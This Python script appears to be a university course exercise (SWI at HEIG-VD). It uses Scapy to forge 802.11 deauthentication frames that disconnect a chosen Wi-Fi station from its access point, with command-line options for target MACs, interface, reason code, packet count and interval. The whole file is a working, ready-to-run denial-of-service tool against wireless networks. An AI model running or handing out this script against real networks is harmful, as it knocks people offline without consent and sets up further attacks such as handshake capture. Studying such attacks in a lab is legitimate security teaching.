#!/usr/bin/python3
from scapy.all import *
import argparse

# Sources: 
# https://scapy.readthedocs.io/en/latest/api/scapy.layers.dot11.html#scapy.layers.dot11.Dot11Deauth
# https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy


reasons = { 1 : True,
            4 : False,
            5 : False,
            8 : True } # True when STA should be sender of deauth

# For type verification
def mac_address(adr):
	if re.search(r"^[a-fA-F0-9]{2}(:[a-fA-F0-9]{2}){5}$", adr):
		return adr
	else:
		raise TypeError()

def main(args):

    # Determine which is the src and dst according to the reason code
    src = args.sta if reasons[args.reason] else args.ap
    dst = args.ap if reasons[args.reason] else args.sta

    #print("Your MAC address:\t\t", get_if_hwaddr(args.interface))
    print("Deauth sent in this order:\t", src, "-->", dst)

    packet = scapy.all.RadioTap()/Dot11(addr1=dst, addr2=src, addr3=src)/Dot11Deauth(reason=args.reason)
    sendp(packet, iface=args.interface, inter=args.interval, count=args.count, verbose=True)



if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Performs a deauthentication attack of a given device",
        epilog="This script was developped as an exercise for the SWI course at HEIG-VD")
    parser.add_argument("--reason", help="""Reason codes:
            1 = Unspecified (default) -
            4 = Disassociated due to inactivity -
            5 = Disassociated because AP is unable to handle all currently associated stations -
            8 = Deauthenticated because sending STA is leaving BSS -
        """,
        choices=reasons.keys(), 
        default=1,
        type=int, 
        required=False)
    parser.add_argument("sta", type=mac_address, help="MAC address of the STA to be deauthenticated")
    parser.add_argument("ap", type=mac_address, help="MAC address of the AP")
    parser.add_argument("interface", help="WLAN interface to use")
    parser.add_argument("--count", "-c", type=int, default="10", help="Number of packets to send", required=False)
    parser.add_argument("--interval", "-i", type=float, default="0.1", help="Interval between two deauth packets", required=False)
    args = parser.parse_args()
    main(args)
